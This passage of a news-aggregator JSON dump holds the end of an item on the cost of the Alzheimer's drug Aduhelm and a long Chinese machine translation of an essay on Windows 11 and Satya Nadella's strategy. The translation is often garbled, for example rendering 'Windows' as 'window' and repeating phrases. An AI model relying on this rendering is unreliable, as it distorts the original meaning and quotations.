drug Aduhelm and the process that led to its approval despite questions about the drug\u2019s clinical benefit,\u201d Reps. Carolyn Maloney (D-N.Y.) and Frank Pallone Jr. (D-N.J.), who are leading the investigation, said in a joint statement.\n So far, Biogen and the FDA appear to be taking the criticism in stride. Biogen CEO Michel Vounatsos\u00a0 defended the pricing, saying in a conference call earlier this month: \u201cWe believe that the price is substantiated by the value it is expected to bring to patients, caregivers, and society.\u201d And acting FDA Commissioner Janet Woodcock, meanwhile, told Stat that she is just \u201c not that concerned\u201d about the intensifying backlash.", "posttime": "2021-06-29 22:25:47", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u56fd\u9632\u90e8,alzheimer,\u836f\u7269", "title": "\u6709\u4e89\u8bae\u7684\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u836f\u7269\u53ef\u80fd\u4f1a\u82b1\u8d39334B\u7f8e\u5143 - \u8fd1\u4e00\u534a\u7684\u56fd\u9632\u90e8\u9884\u7b97 ", "title_en": "Controversial Alzheimer\u2019s drug could cost US $334B\u2013nearly half of DoD budget", "transed": 1, "url": "https://arstechnica.com/science/2021/06/controversial-alzheimers-drug-could-cost-us-334b-nearly-half-of-dod-budget/", "via": "", "real_tags": ["\u56fd\u9632\u90e8", "alzheimer", "\u836f\u7269"]}, {"category": "", "categoryclass": "", "imagename": "d30386b769077b2b4b0697dd8bedf420.png", "infoid": 1068418, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5f53\u60a8\u9009\u62e9\u8fd9\u4e9b\u65e5\u5b50\u8d2d\u4e70\u8ba1\u7b97\u673a\u6216\u667a\u80fd\u624b\u673a\u65f6\uff0c\u60a8\u5fc5\u987b\u5728\u51e0\u4e2a\u6d3e\u7cfb\u4e4b\u95f4\u6311\u9009\u3002\u6709Apple World\uff0c\u5305\u62ecMac\u8ba1\u7b97\u673a\uff0ciPhone\u548ciPad\uff0c\u90fd\u65e8\u5728\u5171\u540c\u52aa\u529b\uff0c\u5e2e\u52a9\u60a8\u5c3d\u53ef\u80fd\u8f7b\u677e\u5730\u5171\u4eab\u6587\u4ef6\uff0c\u89c6\u9891\u804a\u5929\u548c\u770b\u7535\u89c6\u3002\u8fd8\u6709Google Land\uff0c\u5176Android\u8f6f\u4ef6\u4e3a\u4e00\u7cfb\u5217\u7535\u8bdd\uff0c\u5e73\u677f\u7535\u8111\u548c\u8ba1\u7b97\u673a\u63d0\u4f9b\u6743\u529b\u3002\u4f46\u662f\u901a\u8fc7Windows 11\uff0c\u5fae\u8f6f\u5e0c\u671b\u6253\u7834\u8fd9\u79cd\u6a21\u5177\u3002\n \u8be5\u8f6f\u4ef6\u5de8\u5934\u5468\u56db\u8868\u793a\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a\u4e3b\u8981\u7248\u672c\u7684Windows\u5c06\u4f5c\u4e3a\u81ea\u7531\u5347\u7ea7\u4f5c\u4e3a\u672c\u79cb\u5b63\u7684\u514d\u8d39\u5347\u7ea7\uff0c\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u65b0\u529f\u80fd\uff0c\u8fd9\u4e9b\u529f\u80fd\u5728\u67d0\u4e9b\u65b9\u9762\u65e8\u5728\u65e8\u5728\u5c06Microsoft\u5b9a\u4f4d\u4e3a\u4ea7\u54c1\u4e0e\u82f9\u679c\u516c\u53f8\u7684\u4ea7\u54c1\u5408\u4f5c\uff0c\u8c37\u6b4c\u548c\u6f02\u4eae\u7684\u4ea7\u54c1\u522b\u7684\u522b\u4eba\u3002\n \u8be5\u516c\u53f8\u4e3aAndroid\u5e94\u7528\u7a0b\u5e8f\u6269\u5c55\u4e86\u652f\u6301\uff0c\u4f8b\u5982\uff0c\u5141\u8bb8\u4eba\u4eec\u66f4\u8f7b\u677e\u5730\u5728\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u7535\u8bdd\u5e94\u7528\u7a0b\u5e8f\u3002 Microsoft\u4ee5\u4e0eApple\u7684Facetime\u5efa\u7acb\u5728Macs\u4e2d\u7684\u7c7b\u4f3c\u65b9\u5f0f\u4e2d\u5c06\u5176\u56e2\u961f\u8f6f\u4ef6\u5efa\u7acb\u5728Windows\u4e2d - \u9664\u4e86Microsoft\u4e0d\u5e0c\u671b\u5b83\u662f\u72ec\u5360\u7684\u3002\u5df2\u6709Mac\uff0ciPhone\u548cAndroids\u7684Microsoft\u56e2\u961f\u5e94\u7528\u7a0b\u5e8f\u3002 \uff08Microsoft CEO Satya Nadella\u751a\u81f3\u544a\u8bc9\u8bb0\u8005\uff0c\u4ed6\u5f88\u4e50\u610f\u63a5\u53d7FaceTime\u5230Microsoft\u8ba1\u7b97\u673a\u4e0a\u3002\uff09\n \u6211\u771f\u7684\u5f88\u559c\u6b22\u8fd9\u4e2a\u6d3b\u52a8;\u7d27\u7d27\u6293\u4f4f44\u520651\u79d2\uff0c\u5b83\u6709\u4e00\u79cd\u4e50\u8da3\u548c\u8f7b\u76c8\uff0c\u611f\u89c9\u4e0eApple\u7684Covid-ERA\u5546\u4e1a\u822c\u7684\u6f14\u793a\u76f8\u53cd\u3002\u5728\u4e8c\u5341\u5e74\u524d\uff0c\u5f53\u5fae\u8f6f\u5c06\u5728CES\u76db\u5927\u8fc7\u5ea6\u4ea7\u751f\u7684\u6d3b\u52a8\u65f6\u611f\u89c9\u6709\u70b9\u9006\u8f6c\uff0c\u800cApple\u5728MacWorld\u4e0a\u7684\u9884\u7b97\u5236\u4f5c\u3002\n \u5f53\u4f60\u60f3\u5230\u5b83\u65f6\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u60ca\u559c\uff1a\u540e\u6765\u7684\u65b0\u7248\u672c\u7684Windows\u610f\u5473\u7740\u57fa\u672c\u4e0a\u6bcf\u4e2a\u4f7f\u7528\u8ba1\u7b97\u673a\u7684\u4eba\uff0c\u5f00\u53d1\u4eba\u5458\u7684\u65b0\u673a\u4f1a\u7684\u65b0\u7ecf\u9a8c\u4ee5\u53ca\u62c5\u5fc3\u7ade\u4e89\u5bf9\u624b\u7684\u65b0\u7406\u7531\u5bb3\u6015\u8fd9\u53ef\u80fd\u662f\u5fae\u8f6f\u7684\u5e74\u4efd\u4ea7\u54c1\u529f\u80fd\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u82f9\u679c\u6ca1\u6709\u4ec0\u4e48\u53ef\u5931\u53bb\u7684\u3002\n \u4eca\u5929\u662f\u76f8\u53cd\u7684\uff1a\u82f9\u679c\u5728\u8ba1\u7b97\u666f\u89c2\u4e2d\u7edf\u6cbb\u4e86\u81f3\u9ad8\u65e0\u4e0a\u7684\u3002 IOS 15\u5c06\u4e3a\u5341\u4ebf\u7528\u6237\u5e26\u6765\u65b0\u7684\u4f53\u9a8c\uff0c\u65b0\u7684API\u4e3a\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u65b0\u7684\u673a\u4f1a\uff0c\u82f9\u679c\u4e0d\u4ec5\u4ec5\u5728\u4f24\u5bb3\u7ade\u4e89\u5bf9\u624b\u7684\u529f\u80fd\u4e2d\u5efa\u7acb\uff0c\u800c\u4e14\u521b\u9020\u65b0\u7684\u529f\u80fd\uff08\u5373Facebook\u548cApp\u5b89\u88c5\u5e7f\u544a\uff09;\u5b83\u662fWindows\uff0c\u611f\u89c9\u5c31\u50cf\u5b83\u6ca1\u6709\u4ec0\u4e48\u53ef\u5931\u53bb\u7684\u3002\n  \u5f53\u7136\uff0cWindows\u4ecd\u7136\u662f\u5fc5\u9700\u7684\u8f6f\u4ef6\uff0c\u62e5\u6709\u4ebf\u4e07\u7684UserBase\uff0c\u7279\u522b\u662f\u4f01\u4e1a\u666f\u89c2\u7684\u5173\u952e\u90e8\u5206\uff08\u5c3d\u7ba1\u5982\u6b64\uff0c\u968f\u7740\u516c\u53f8\u5728\u6f14\u793a\u4e2d\u5f3a\u8c03\u7684\uff0cCovid\u91cd\u65b0\u5efa\u7acb\u4e86PC\u4e3a\u6d88\u8d39\u8005\u7684\u91cd\u8981\u6027\u51fa\u8272\u5730\uff09\u3002\u4f46\u662f\uff0c\u4ecb\u7ecd\u4e86\u66f4\u81ea\u7531\u7684\u8fd0\u52a8\uff0c\u662fWindows\u4e0d\u518d\u662f\u4e1a\u52a1\u7684\u6838\u5fc3\u3002\u8fd9\u4ecd\u7136\u662fCEO Satya Nadella\u6700\u5927\u7684\u80dc\u5229;\u6211\u8bb2\u8ff0\u4e86\u4ed6\u5982\u4f55\u57282018\u5e74\u57282018\u5e74\u5f00\u59cb\u5c06\u516c\u53f8\u4ece\u5176\u4ee5Windows\u4e3a\u4e2d\u5fc3\u8f6c\u79fb\u5230Windows\u7684\u5c3d\u5934\uff1a \nWindows\u7684\u6545\u4e8b\u7684\u8870\u9000\u662f\u76f8\u5bf9\u7b80\u5355\u7684\uff0c\u5e76\u4e14\u662f\u4e00\u79cd\u7ecf\u5178\u7684\u7834\u574f\u60c5\u51b5\uff1a\n \u667a\u80fd\u624b\u673a\u9996\u6b21\u5bfb\u5740\u9700\u8981PC\u4e0d\u80fd\uff0c\u7136\u540e\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u5f00\u59cb\u76f4\u63a5\u63a5\u7ba1PC\u529f\u80fd\n \u66f4\u6709\u8da3\u7684\u662f\uff0c\u96f7\u5fb7\u8499\u5fb7\u7684\u7a97\u6237\u7684\u6545\u4e8b\u662f\uff0c\u6700\u7ec8\u4e0e\u4e0a\u5468\u7684\u91cd\u7ec4\u6709\u6548\uff0c\u8fd9\u662f\u7531\u4e8e\u81ea1980\u5e74\u4ee5\u6765\u9996\u6b21\u79bb\u5f00\u516c\u53f8\u6ca1\u6709\u4e13\u95e8\u7528\u4e8e\u4e2a\u4eba\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u7684\u90e8\u95e8\uff08Windows\u88ab\u62c6\u5206\uff0c\u6838\u5fc3\u5de5\u7a0b\u96c6\u56e2\u5728Azure\u4e0b\u7f6e\u4e8eAzure\uff0c\u4ee5\u53ca\u5728Office 365\u4e0b\u6709\u6548\u5730\u8fdb\u884c\u4e86\u7ec4\u7ec7\u7684\u5176\u4f59\u90e8\u5206;\u4ecd\u7136\u5b58\u5728Windows\u53d1\u5e03\uff0c\u4f46\u5b83\u4e0d\u518d\u662f\u72ec\u7acb\u7684\u4e1a\u52a1\uff09\u3002\u4e94\u5e74\u524d\u8fd9\u6837\u7684\u4e3e\u52a8\u4f3c\u4e4e\u4e0d\u53ef\u80fd\uff0c\u5f53\u5728\u53e6\u4e00\u4e2a\u91cd\u7ec4\u7684\u80cc\u666f\u4e0b\uff0c\u524d\u4efb\u9996\u5e2d\u6267\u884c\u5b98\u53f2\u8482\u592b\u9c8d\u5c14\u9ed8\u5199\u4e86\u4e00\u4e2a\u5907\u5fd8\u5f55\uff0c\u575a\u6301\u8ba4\u4e3aWindows\u662f\u672a\u6765......\n \u56e0\u6b64\uff0c\u6211\u7684\u65ad\u8a00\u5728\u9876\u90e8\uff0c\u90a3\u4e2a\u5fae\u8f6f\u5982\u4f55\u63a5\u53d7Windows\u7684\u73b0\u5b9e\u7684\u6545\u4e8b\u6bd4Windows\u7684\u8870\u9000\u66f4\u6709\u8da3;\u8fd9\u662fCEO Satya Nadella\u5982\u4f55\u76f8\u4fe1\u8be5\u516c\u53f8\u63a5\u53d7\u660e\u663e\u7684\u3002\n \u8fd9\u7bc7\u6587\u7ae0\u7684\u5176\u4f59\u90e8\u5206\u904d\u5386Nadella LED Microsoft\u5230\u90a3\u4e2a\u70b9\uff0c\u5305\u62eciPad\u529e\u516c\u5ba4\uff0c\u4ed6\u7684\u4e00\u4e9b\u6218\u7565\u5907\u5fd8\u5f55\uff0c\u5e76\u6740\u6b7bWindows\u624b\u673a;\u6211\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u9648\u8bcd\u6ee5\u8c03\uff0c\u8bf4\u67d0\u4e9b\u4e8b\u60c5\u662f\u4e3a\u4e86\u4e00\u4e2a\u4f1f\u5927\u7684\u5546\u4e1a\u6848\u4f8b\u7814\u7a76\uff0c\u4f46\u8fd9\u771f\u7684\u662f\u4e3a\u4e86\u4e00\u4e2a\u4f1f\u5927\u7684\u5546\u4e1a\u6848\u4f8b\u7814\u7a76\uff01\n Nadella\u7684\u53d8\u9769\u7ba1\u7406\u4e5f\u542f\u7528\u4e86\uff0c\u7a83\u53d6Joanna Stern\u7684\u4ee4\u4eba\u6109\u5feb\u7684Nadella\u6109\u5feb\u7684\u91c7\u8bbf\uff0c\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u201c\u5f00\u59cb\u201d\uff1a\n  \u662f\u7684\uff0c\u53c2\u8003\u662f\u5173\u4e8e\u5c06\u201c\u5f00\u59cb\u201d\u83dc\u5355\u79fb\u52a8\u5230\u4e2d\u5fc3\uff0c\u4f46\u5b83\u4e5f\u9002\u7528\u4e8eWindows\u673a\u4f1a\uff0c\u5e76\u4e14\u8be5\u673a\u4f1a\u53ea\u5b58\u5728\uff0c\u56e0\u4e3a\u4e4b\u524d\u7684\u662f\u5df2\u7ecf\u7ed3\u675f\u4e86\u3002 \n\u8981\u8fd4\u56de\u4e8c\u5341\u5e74\u524d\u7684Windows / Mac\u6bd4\u8f83\uff0cApple\u7684\u95ee\u9898\u80af\u5b9a\u662f\u7f3a\u4e4f\u5f00\u53d1\u4eba\u5458\uff0c\u4f46\u6700\u91cd\u8981\u7684\u662f\uff0c\u516c\u53f8\u6839\u672c\u6ca1\u6709\u8db3\u591f\u7684\u7528\u6237\u3002\u516c\u53f8\u4fee\u590d\u95ee\u9898\u7684\u65b9\u5f0f\u662f\u60a8\u5bf9\u82f9\u679c\u6240\u671f\u671b\u7684\u65b9\u5f0f\uff1a\u4ed6\u4eec\u4f9d\u9760\u81ea\u5df1\u3002\u53f2\u8482\u592b\u4e54\u5e03\u65af\u65f6\u4ee3\u6700\u8f89\u714c\u548c\u4f4e\u4f30\u7684\u52a8\u4f5c\u4e4b\u4e00\u662f\u5f00\u53d1IMovie\uff0ciPhoto\uff0ciTunes\uff0cIDVD\u548cGarageBand\u7684IMovie\u5957\u4ef6\u7684\u5f00\u53d1\u3002\u6211\u53bb\u5e74\u6ce8\u610f\u5230\u82f9\u679c\u7684\u8f6c\u79fb\u5dee\u5f02\u5316\uff1a\n OS X\u5c06\u8f6f\u4ef6\u5e26\u5230\u4e86\u6700\u524d\u6cbf\uff0c\u4e0d\u4ec5\u4ec5\u662f\u4e00\u79cd\u6280\u672f\u4e0a\u542c\u8d77\u6765\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c\u4e14\u57fa\u4e8eUNIX\u7684\u4ea7\u54c1\uff0c\u5bf9\u5f00\u53d1\u4eba\u5458\u7279\u522b\u6709\u5438\u5f15\u529b\u3002\u800c\u4e14\uff0c\u5728\u6d88\u8d39\u8005\u65b9\u9762\uff0cApple\u53d1\u5e03\u4e86ILIFE\uff0c\u8fd9\u662f\u4e00\u5957\u5e94\u7528Mac\u5bf9\u666e\u901a\u7528\u6237\u6709\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u6211\u81ea\u5df1\u5728\u8fd9\u4e2a\u65f6\u4ee3\u4e70\u4e86\u6211\u7684\u7b2c\u4e00\u6b21Mac\uff0c\u56e0\u4e3a\u6211\u60f3\u4f7f\u7528\u5e93\u5409\u7279; 16\u5e74\uff0c\u6211\u7684\u97f3\u4e50\u91ce\u5fc3\u88ab\u9057\u5f03\uff0c\u4f46\u6211\u7684Mac\u4f7f\u7528\u4ecd\u7136\u5b58\u5728\u3002\n \u5230\u90a3\u4e00\u70b9\uff0c\u6211\u5df2\u7ecf\u8d2d\u4e70\u4e86\u4e00\u5f20Mac\uff0c\u5c3d\u7ba1\u5b83\u7684\u786c\u4ef6\u867d\u7136\u6211\u7684iBook\u8db3\u591f\u6709\u5438\u5f15\u529b\uff0c\u4f46\u5b83\u7684\u5904\u7406\u5668\u662f\u4e00\u4e2a\u6469\u6258\u7f57\u62c9G4\uff0c\u6ca1\u6709\u4e0e\u82f1\u7279\u5c14\u7684X86\u52a0\u5de5\u5546\u8fdc\u7a0b\u7ade\u4e89;\u665a\u4e9b\u65f6\u5019\uff0c\u90a3\u4e2a\u5e74\u540e\u7684\u5de5\u4f5c\u4f7f\u90a3\u4e9b\u4ee4\u4eba\u9707\u60ca\u7684\u4e14\u56de\u60f3\u8d77\u6765\u7684\u660e\u663e\u51b3\u5b9a\u5c06MAC\u8f6c\u79fb\u5230\u82f1\u7279\u5c14\u5904\u7406\u5668\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4e0e\u884c\u4e1a\u4e2d\u5176\u4ed6\u4eba\u5177\u6709\u76f8\u540c\u7684\u786c\u4ef6\u5c06\u662f\u82f9\u679c\u7684\u4e00\u4e2a\u5927\u724c\uff0c\u66f4\u597d\u5730\u8ba9\u4ed6\u4eec\u7684\u84ec\u52c3\u53d1\u5c55\u7684\u8f6f\u4ef6\u5206\u5316\u4eae\u76f8\u3002\n \u6211\u5728\u53d1\u5e03M1 Mac\u53d1\u5e03\u65f6\u5199\u7684\u90a3\u7bc7\u6587\u7ae0\u7684\u91cd\u70b9\u662fApple\u7684\u8f6f\u4ef6\u5dee\u5f02\u5316\uff0c\u7279\u522b\u662f\u5728Mac\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u591a\u5e74\u6765\u7684\u6700\u5c0f\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u516c\u53f8\u7684\u5408\u9002\u7684\u539f\u56e0\u5dee\u5f02\u5316\u6b63\u5728\u8f6c\u56de\u786c\u4ef6\u3002\u7136\u800c\uff0c\u6709\u8da3\u7684\u662f\uff0c\u8fd9\u610f\u5473\u7740\u5fae\u8f6f\u5728\u8be5\u786c\u5e01\u7684\u53e6\u4e00\u8fb9\u5b9a\u4e49\u4e86\uff1a\u82f9\u679c\u82af\u4f18\u4e8eX86\uff08\u6216\u5176\u4ed6ARM\u82af\u7247\uff09\u7684\u7a0b\u5ea6\u662f\u7a97\u6237\u5904\u4e8e\u7f3a\u70b9\u7684\u7a0b\u5ea6\u3002\n  \u50cfApple\u4e00\u6837\uff0c\u5fae\u8f6f\u6b63\u5728\u901a\u8fc7\u505a\u51fa\u6700\u597d\u7684\u4e8b\u60c5\u6765\u54cd\u5e94\uff0c\u4f46\u662f\uff0c\u56e0\u4e3a\u5b83\u662f\u5fae\u8f6f\uff0c\u5b83\u662f\u82f9\u679c\u7684\u5b8c\u5168\u76f8\u540c\uff1a\u800c\u4e0d\u662f\u66f4\u6df1\u5165\u5730\u6574\u5408\u5e76\u5c3d\u4e00\u5207\u90fd\u8bd5\u56fe\u5438\u5f15\u6d88\u8d39\u8005\uff0c\u4ed6\u4eec\u6b63\u5728\u5f00\u653e\u548c\u53bb\u9664\u8bd5\u56fe\u5438\u5f15\u5f00\u53d1\u4eba\u5458\u7684\u9650\u5236\uff0c\u5e76\u7531\u4e0d\u60f3\u88ab\u878d\u5165\u82f9\u679c\u751f\u6001\u7cfb\u7edf\u7684\u6269\u5c55\u6d88\u8d39\u8005\u3002\n  Patel\uff1a\u8fd9\u8ba9\u6211\u4ecb\u7ecd\u4e86Windows\u4e2d\u7684\u4e00\u4e9b\u5927\u53d8\u5316\uff0c\u4ece\u800c\u6839\u672c\u6d89\u53ca\u4ec0\u4e48\u6837\u7684\u64cd\u4f5c\u7cfb\u7edfWindows\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c\u4ec0\u4e48\u6837\u7684\u4f01\u4e1a\u4ee5\u53ca\u5fae\u8f6f\u5c06\u662f\u4ec0\u4e48\u6837\u7684\u4e1a\u52a1\u3002\n \u6709\u4e00\u4e2a\u65b0\u7684\u7528\u6237\u754c\u9762\u3002 \u201c\u5f00\u59cb\u201d\u6309\u94ae\u4f4d\u4e8e\u5c4f\u5e55\u7684\u4e2d\u5fc3\u3002\u6709\u5316\u5986\u54c1\u5dee\u5f02\u3002\u4f46\u662f\u60a8\u8fd8\u5141\u8bb8Android\u5e94\u7528\u7a0b\u5e8f\u5728Windows\u4e0a\u8fd0\u884c\u3002\u60a8\u6b63\u5728\u96c6\u6210Amazon Android App Store\u3002\u60a8\u5bf9\u5546\u5e97\u7ecf\u6d4e\u5b66\u8fdb\u884c\u4e86\u4e00\u4e9b\u53d8\u5316\u3002\u4f60\u51cf\u5c11\u4e86\u5fae\u8f6f\u7684\u524a\u51cf\u5230\u4e8615\uff05\u3002\u4e0e\u82f9\u679c\u6536\u8d39\u7684\u4e89\u8bae30\uff05\u76f8\u6bd4\uff0c\u8fd9\u76f8\u6bd4\u4e4b\u4e0b\u3002 \n\u7136\u540e\u4f60\u5bf9\u5f00\u53d1\u4eba\u5458\u8bf4\uff0c\u201c\u4f60\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u5546\u5e97\u4e2d\uff0c\u5982\u679c\u4f60\u60f3\u4f7f\u7528\u81ea\u5df1\u7684\u4ed8\u6b3e\u6a21\u5f0f\uff0c\u4f60\u6839\u672c\u65e0\u6cd5\u652f\u4ed8\u7ed9\u6211\u4eec\u3002\u201d\u591a\u5c11\u662f\u673a\u4f1a\u4e3b\u4e49\u7684\u53d8\u5316 - \u4f60\u770b\u5230\u4e86\u6240\u6709\u4e89\u8bae\uff0c\u4f60\u611f\u89c9\u5230\u5e02\u573a\u673a\u4f1a\uff1f\u8fd9\u662f\u6539\u53d8\u4e1a\u52a1\u7684\u6b63\u786e\u65b9\u6cd5\u5417\uff1f\n Nadella\uff1a\u6211\u8ba4\u4e3a\u8fd9\u662f\u7531\u7ade\u4e89\u9a71\u52a8\u7684\u3002\u6211\u7684\u610f\u601d\u662f -  Microsoft\u5e94\u8be5\u505a\u4e9b\u4ec0\u4e48\u6765\u7ba1\u7406\u5e73\u53f0\u548c\u5e73\u53f0\u89c4\u5219\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u8301\u58ee\u6210\u957f\uff1f\n \u6211\u89e3\u91ca\u4e86\u54ea\u4e9b\u5e73\u53f0\u6240\u505a\u7684\u65b9\u5f0f\u662f\uff1a\u4ed6\u4eec\u5fc5\u987b\u4e3a\u5728\u5e73\u53f0\u4e0a\u5efa\u7acb\u7684\u4eba\u521b\u9020\u673a\u4f1a\u3002\u8fd9\u662f\u4fdd\u6301\u5e73\u53f0\u76f8\u5173\u7684\u65b9\u5f0f\u3002\u5982\u679c\u60a8\u4e3a\u5176\u4ed6\u4eba\u521b\u9020\u4e86\u4e00\u4e2a\u5f88\u597d\u7684\u673a\u4f1a\uff0c\u5c31\u4f1a\u51fa\u751f\u5728\u60a8\u7684\u5e73\u53f0\u4e0a\u5e76\u5728\u60a8\u7684\u5e73\u53f0\u4e0a\u7f29\u653e - \u8fd9\u662f\u6211\u5728\u5fae\u8f6f\u4e2d\u5ef6\u4f38\u7684\u3002\u8fd9\u662f\u6211\u957f\u5927\u7684\u7a97\u53e3\u3002\u662f\u5426\u662fAdobe Folds\u521b\u5efa\u4ed6\u4eec\u7684\u521b\u610f\u4e91\u6216SAP\u6784\u5efa\u4ed6\u4eec\u7684ERP [\u4f01\u4e1a\u8d44\u6e90\u89c4\u5212]\u4e1a\u52a1\u3002\u6216\u8005\u5728\u4eca\u5929\u7684\u4e16\u754c\u4e2d\uff0c\u65e0\u8bba\u662f\u5728Windows\u6216\u4efb\u4f55\u5176\u4ed6\u4e1a\u52a1\u4e0a\u4e3a\u6e38\u620f\u73a9\u5bb6\u5efa\u7acb\u793e\u533a\u3002\n  \u6211\u611f\u89c9\u5230\u4e00\u4e2a\u771f\u6b63\u7684\u673a\u4f1a\uff0c\u56e0\u4e3a\u5176\u4ed6\u4e24\u4e2a\u751f\u6001\u7cfb\u7edf\u4ee5\u9cde\u7247\u4e3a\u4f8b\uff0c\u56e0\u4e3a\u4ed6\u4eec\u81ea\u5df1\u7684\u5185\u90e8\u4e00\u81f4\u7684\u539f\u56e0\uff0c\u81f3\u5c11\u5728\u6211\u7684\u8111\u6d77\u4e2d\u6df7\u6dc6 - \u5177\u6709\u4e00\u7ec4\u89c4\u5219\u7684\u5e73\u53f0\u548c\u805a\u5408\u5c42\u3002\u6ca1\u6709\u7406\u7531\u5e94\u8be5\u6709\u4e00\u5957\u89c4\u5219\u3002\u5b83\u4eec\u53ef\u4ee5\u5206\u89e3\u3002\u6bd5\u7adf\uff0c\u6211\u4eec\u6709\u4e00\u5bb6\u5546\u5e97\u3002\u6211\u4eec\u6709\u5546\u4e1a\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\uff0c\u6216\u8005\u60a8\u53ef\u4ee5\u5e26\u6765\u81ea\u5df1\u7684\u3002\u8fd9\u662f\u5fae\u8f6f\u7684[a]\u5b9e\u9645\u7684\u4e8b\u60c5\u3002\n \u6211\u751a\u81f3\u4e0d\u60f3\u5c1d\u8bd5\u5236\u4f5c\u4e00\u4e9b\u4ef7\u503c\u58f0\u660e\uff0c\u5fae\u8f6f\u5728\u8fd9\u91cc\u662f\u5584\u826f\uff0c\u5176\u4ed6\u4eba\u4e0d\u662f\u3002\u5176\u4ed6\u4eba\u4e3a\u4ed6\u4eec\u62e5\u6709\u7684\u4efb\u4f55\u539f\u56e0\u90fd\u9009\u62e9\u4e86\u5b83\u3002\u8fd9\u662f\u4e00\u4e2a\u8bbe\u8ba1\u9009\u62e9\u548c\u5546\u4e1a\u6a21\u5f0f\u9009\u62e9\u3002\u6211\u60f3\u5236\u4f5c\u81ea\u5df1\u7684\u8bbe\u8ba1\u548c\u5546\u4e1a\u6a21\u5f0f\u9009\u62e9\uff0c\u4ee5\u4fbf\u521b\u9020\u8005\u627e\u5230\u66f4\u591a\u9009\u62e9\u3002\n \u8fd9\u5f88\u5bb9\u6613 - \u548c\u5bf9\uff01 - \u8bf7\u6ce8\u610f\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u5546\u5e97\u65f6\uff0c\u5fae\u8f6f\u80af\u5b9a\u6ca1\u6709\u4ec0\u4e48\u53ef\u5931\u53bb\u7684\u3002\u4ed6\u4eec\u6ca1\u6709\u4eceWindows App Store\u4e2d\u83b7\u5f97\u591a\u5c11\u94b1\uff0c\u5e76\u4e14\u4ed6\u4eec\uff08\u4ecd\u7136\uff09\u9700\u8981\u4e3a\u4ed6\u4eec\u7684\u5e73\u53f0\u83b7\u5f97\u66f4\u591a\u7684\u6d88\u8d39\u8005\u5e94\u7528\u7a0b\u5e8f\u3002\u4e0e\u6b64\u540c\u65f6\uff0cNadella\u7684\u5386\u53f2\u6846\u67b6\u975e\u5e38\u9002\u5408\u5fae\u8f6f\u4e00\u76f4\u5728\u8003\u8651Windows;\u6211\u6253\u7535\u8bdd\u7ed9\u6bd4\u5c14\u76d6\u8328\u7ebf\uff1a\n \u5728\u8fc7\u53bb\u7684\u51e0\u5468\u91cc\uff0c\u6211\u4e00\u76f4\u5728\u63a2\u7d22\u5e73\u53f0\u548c\u805a\u5408\u8005\u4e4b\u95f4\u5b58\u5728\u7684\u5dee\u5f02\uff0c\u5e76\u4eceChamath Palihapitiya\u63d0\u9192\u4e86\u8fd9\u4e2a\u8f76\u4e8b\uff0c\u53c2\u52a0\u4e86Shah Semil Shah\uff1a \nSemil Shah\uff1a\u60a8\u662f\u5426\u5728Facebook\u5e73\u53f0\u548c\u8fde\u63a5\u7684Facebook\u4e2d\u770b\u5230\u4e86\u4ece\u60a8\u7684\u65f6\u95f4\u5185\u770b\u5230\u7684\u4efb\u4f55\u76f8\u4f3c\u4e4b\u5904\uff0c\u4ee5\u53ca\u4f18\u6b65\u53ef\u80fd\u4f1a\u63d0\u9ad8\u4ed6\u4eec\u7684\u5e73\u53f0\uff1f\n Chamath\uff1a\u4ed6\u4eec\u90fd\u4e0d\u662f\u5e73\u53f0\u3002\u4ed6\u4eec\u90fd\u662f\u50cf\u8fd9\u4e9b\u5584\u610f\u7684\u52aa\u529b\uff0c\u4f60\u662f\u7b2cn\u4e2a\u4f18\u5148\u4e8b\u9879\u3002\u6211\u8d1f\u8d23Facebook\u5e73\u53f0\u3002\u6211\u4eec\u50cf\u4e00\u4e9b\u70ed\u95e8\u72d7\u5c4e\u5927\u4ea4\u6613\u4e00\u6837\u6392\u65a5\u51fa\u6765\u3002\u6211\u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u6bd4\u5c14\u76d6\u8328\u7684\u8d44\u91d1\u4e0a\u63d0\u51fa\uff0c3\u62164\u4e2a\u6708\u540e - \u5982\u6211\u4eec\u7684\u8d44\u91d1\u5386\u53f2\u4e3a500\u4e07\u7f8e\u5143\uff0c83\u7c73\uff0c500\u7c73\uff0c\u7136\u540e$ 15B\u3002\u5f53Facebook\u5e73\u53f0\u540e\u51e0\u4e2a\u6708\u53d1\u751f\u4e8615B\u7684\u65f6\u5019\uff0c\u76d6\u8328\u6cbf\u7740\u90a3\u6761\u7ebf\u8bf4\uff0c\u201c\u8fd9\u662f\u4e00\u5757\u72d7\u5c4e\u3002\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5e73\u53f0\u3002\u4e00\u4e2a\u5e73\u53f0\u662f\u5f53\u4f7f\u7528\u5b83\u7684\u6bcf\u4e2a\u4eba\u7684\u7ecf\u6d4e\u4ef7\u503c\u8d85\u8fc7\u521b\u9020\u5b83\u7684\u516c\u53f8\u7684\u4ef7\u503c\u3002\u90a3\u662f\u4e00\u4e2a\u5e73\u53f0\u3002\u201c\n \u901a\u8fc7\u8fd9\u9879\u6d4b\u91cf\uff0cWindows\u786e\u5b9e\u662f\u6700\u7ec8\u7684\u5e73\u53f0 - 